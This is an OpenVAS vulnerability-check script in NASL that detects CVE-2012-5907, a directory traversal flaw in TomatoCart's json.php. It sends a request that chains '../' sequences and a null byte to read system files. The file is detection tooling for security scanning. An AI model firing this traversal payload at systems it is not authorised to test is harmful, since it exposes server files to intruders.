###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_tomatocart_dir_traversal_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# TomatoCart 'json.php' Directory Traversal Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application and execute
  arbitrary script code.
  Impact Level: Application";
tag_affected = "TomatoCart version 1.2.0 Alpha 2 and prior";
tag_insight = "The flaw is due to improper validation of user supplied input via the 'module'
  parameter to json.php, which allows attackers to read arbitrary files via a
  ../(dot dot) sequences.";
tag_solution = "No solution or patch is available as of 28th November, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.tomatocart.com/";
tag_summary = "This host is installed with TomatoCart and is prone to directory traversal
  vulnerability.";

if(description)
{
  script_id(901302);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-5907");
  script_bugtraq_id(52766);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-11-28 10:32:05 +0530 (Wed, 28 Nov 2012)");
  script_name("TomatoCart 'json.php' Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check for directory traversal vulnerability in TomatoCart");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://osvdb.org/80689");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74459");
  script_xref(name : "URL" , value : "http://www.mavitunasecurity.com/local-file-inclusion-vulnerability-in-tomatocart/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/111291/TomatoCart-1.2.0-Alpha-2-Local-File-Inclusion.html");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## variable initialization
cartUrl = "";
cartPort = 0;

## Get HTTP port
if (!cartPort = get_http_port(default:80))exit(0);

## check port state
if(!get_port_state(cartPort))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:cartPort))exit(0);

foreach dir (make_list("/TomatoCart", "/tomatocart", "", cgi_dirs()))
{
  cartUrl = dir + "/index.php";

  if(http_vuln_check(port:cartPort, url:cartUrl, pattern:">TomatoCart<",
     check_header:TRUE, extra_check:make_list('>Login<','>Create Account<','>My Wishlist<')))
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      cartUrl = dir + "/json.php?action=3&module=" +
            crap(data:"../", length:3*15) + files[file] + "%00";

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:cartPort, url:cartUrl, check_header:TRUE, pattern:file))
      {
        security_warning(cartPort);
        exit(0);
      }
    }
  }
}
